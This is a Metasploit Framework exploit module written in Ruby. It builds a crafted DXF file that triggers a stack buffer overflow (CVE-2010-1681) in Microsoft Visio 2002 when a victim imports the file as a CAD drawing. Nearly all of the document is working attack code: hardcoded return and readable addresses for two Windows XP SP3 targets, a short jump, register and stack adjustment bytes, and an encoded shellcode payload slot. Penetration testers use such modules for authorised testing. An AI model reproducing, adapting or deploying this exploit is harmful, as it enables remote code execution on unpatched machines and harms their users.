##
# $Id: visio_dxf_bof.rb 13034 2011-06-26 16:09:53Z sinn3r $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::FILEFORMAT

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft Office Visio VISIODWG.DLL DXF File Handling Vulnerability',
			'Description'    => %q{
					This module exploits a stack based overflow vulnerability in the handling
				of the DXF files by Microsoft Visio 2002. Revisions prior to the release of
				the MS bulletin MS10-028 are vulnerable. The overflow occurs when the application
				is used to import a specially crafted DXF file, while parsing the HEADER section
				of the DXF file.

				To trigger the vulnerability an attacker must convince someone to insert a
				specially crafted DXF file to a new document, go to 'Insert' -> 'CAD Drawing'
				},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'CORE Security',  # original discovery
					'Shahin Ramezany <shahin[at]abysssec.com>', # MOAUB #8 exploit and binary analysis
					'juan vazquez', # metasploit module
				],
			'Version'        => '$Revision: 13034 $',
			'References'     =>
				[
					[ 'CVE','2010-1681' ],
					[ 'OSVDB', '64446' ],
					[ 'BID', '39836' ],
					[ 'URL', 'http://www.coresecurity.com/content/ms-visio-dxf-buffer-overflow' ],
					[ 'URL', 'http://www.exploit-db.com/moaub-8-microsoft-office-visio-dxf-file-stack-overflow/' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'DisablePayloadHandler' => 'true',
				},
			'Payload' =>
				{
					'Space'         => 2000,
					'BadChars'      => Rex::Text.charset_exclude(Rex::Text::AlphaNumeric),
					'DisableNops'   => true, # no need
					'EncoderOptions' =>
						{
							'BufferRegister' => 'ECX'
						}
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					# Microsoft Office Visio 2002
					# VISIO.EXE v10.0.525.4
					# VISIODWG.DLL v10.0.525.4
					# ECXAdjust:
					# 0x8 => ESP points to the prepended shellcode
					# 0x1A => Padding
					# 0x2 => len(push esp, pop ecx)
					# 0x3 => len(sub)
					# 0x6 => len(add)
					[
						'Visio 2002 English on Windows XP SP3 Spanish',
						{
							'Ret'         => 0x6173345c, # push esp, ret from VISIODWG.DLL
							'Offset'      => 0x50,       # EIP
							'ReadAddress' => 0x617a4748, # points to VISIODWG.DLL data segment
							'ECXAdjust'   => 0x2D
						}
					],
					[
						'Visio 2002 English on Windows XP SP3 English',
						{
							'Ret'         => 0x60455F6B, # push esp, ret from VISLIB.DLL
							'Offset'      => 0x50,       # EIP
							'ReadAddress' => 0x66852040, # points to VISIODWG.DLL data segment
							'ECXAdjust'   => 0x2D,
						}
					],
				],
			'DisclosureDate' => 'May 04 2010'))

		register_options(
			[
				OptString.new('FILENAME',   [ true, 'The file name.',  'msf.dxf']),
			], self.class)
	end

	def exploit
		content = "0\n"
		content << "SECTION\n"
		content << "2\n"
		content << "HEADER\n"
		content << "9\n"
		content << "$ACADMAINTVER"
		content << rand_text_alpha(target['Offset'] - "ACADMAINTVER".length)
		content << [target.ret].pack('V') # new ret
		content << "\xeb\x20\x90\x90" # short jmp to payload (plus two padding nops)
		content << [target['ReadAddress']].pack('V') # readable address to avoid exceptions
		content << rand_text_alpha(0x1A) # jumped by the short jump
		# Get in ECX a pointer to the shellcode start
		content << "\x54" # push esp
		content << "\x59" # pop ecx
		# ecx adjustment
		content << Rex::Arch::X86.sub(-(target['ECXAdjust']),Rex::Arch::X86::ECX, "\x00\x0d\x0a", false, true)
		# Stack adjustment
		content << "\x81\xc4\x48\xf4\xff\xff" # add esp, -3000
		content << payload.encoded
		content << "\n"
		content << "0\n"
		content << "ENDSEC\n"
		content << "0\n"
		content << "EOF\n"

		print_status("Creating #{datastore['FILENAME']} ...")
		file_create(content)
	end

end
